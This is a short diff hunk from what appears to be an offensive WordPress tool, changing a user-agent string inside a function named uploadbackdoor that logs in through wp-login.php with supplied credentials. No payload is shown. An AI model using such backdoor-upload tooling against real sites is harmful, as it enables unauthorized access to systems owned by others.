@@ -8,7 +8,7 @@ __author__ = 'Esteban Rodriguez (n00py)'
 
 def uploadbackdoor(host,username,password,type,verbose):
     url = host + '/wp-login.php'
-    headers = {'user-agent': 'n00py Auto-shell',
+    headers = {'user-agent': 'Yertle backdoor uploader',
                'Accept-Encoding' : 'none'
     }
     payload = {'log': username,
